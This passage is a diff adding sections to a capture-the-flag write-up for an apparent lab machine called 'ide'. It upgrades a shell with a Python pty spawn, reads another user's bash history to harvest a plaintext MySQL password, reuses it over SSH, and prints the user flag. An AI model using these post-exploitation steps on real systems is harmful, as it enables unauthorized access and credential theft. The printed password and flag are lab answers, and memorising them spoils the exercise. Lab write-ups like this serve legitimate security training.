@@ -262,7 +262,21 @@ $
 
 ## Terminal Upgrade
 
+Finally, we've made it into the remote machine. But we have a dumb terminal so before we start looking for the first flag we should upgrade our terminal.
 
+First we'll check if Python is on the remote machine by using the Linux ```which``` command followed by all Python versions.
+
+```
+$ which python python2 python3
+
+/usr/bin/python3
+```
+
+Now that we've confirmed which version of Python is on the system we'll type in the following command.
+
+```python3 -c 'import pty; pty.spawn("/bin/bash")'```
+
+Now we can comfortably start horizontal privilege escalation.
 
 [Back To Top](#ide "Jump To Top")
 
@@ -270,7 +284,97 @@ $
 
 ## Horizontal Escalation
 
+We can start by checking who we are (```whoami```) and where we are (```pwd```).
 
+```
+www-data@ide:/$ whoami
+www-data
+
+www-data@ide:/$ pwd
+/
+```
+
+Next we can check what other users exist in the ```/home``` directory.
+
+```
+www-data@ide:/$ ls -la /home
+ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Jun 17  2021 .
+drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
+drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac
+```
+
+Now that we've found the other user (```drac```) we should list everything in his current directory with ```ls -la```.
+
+```
+ls -la /home/drac
+
+total 52
+drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
+drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
+-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
+-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
+-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
+drwx------ 4 drac drac 4096 Jun 18  2021 .cache
+drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
+drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
+drwx------ 3 drac drac 4096 Jun 18  2021 .local
+-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
+-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
+-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
+-r-------- 1 drac drac   33 Jun 18  2021 user.txt
+```
+
+We found the ```user.txt``` file which contains our first flag but we don't have readable permissions. We can however read some of his other files.
+
+Let's find out what commands ```drac``` runs by reading his Bash history within the ```.bash_history``` file.
+
+```
+www-data@ide:/$ cat /home/drac/.bash_history
+
+mysql -u drac -p 'Th3dRaCULa1sR3aL'
+```
+
+It seems ```drac``` has logged into his ```mysql``` database with the same username he uses here and the password ```Th3dRaCULa1sR3aL```. Maybe he also reuses his password.
+
+Let's check by trying to SSH into ```drac@<IP_Address>``` with the password he uses for his ```mysql``` database.
+
+```
+$ ssh drac@<IP_Address>
+
+drac@<IP_Address>'s password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Feb 21 23:12:46 UTC 2023
+
+  System load:  0.0               Processes:           113
+  Usage of /:   50.0% of 8.79GB   Users logged in:     0
+  Memory usage: 43%               IP address for eth0: 10.10.218.57
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+69 packages can be updated.
+1 update is a security update.
+
+drac@ide:~$
+```
+
+Okay, we're in and we've been dumped into dracs home directory so all we need to do to get the first flag is ```cat``` the ```user.txt``` file.
+
+```
+drac@ide:~$ cat user.txt
+02930d21a8eb009f6d26361b2d24a466
+```
 
 [Back To Top](#ide "Jump To Top")
 
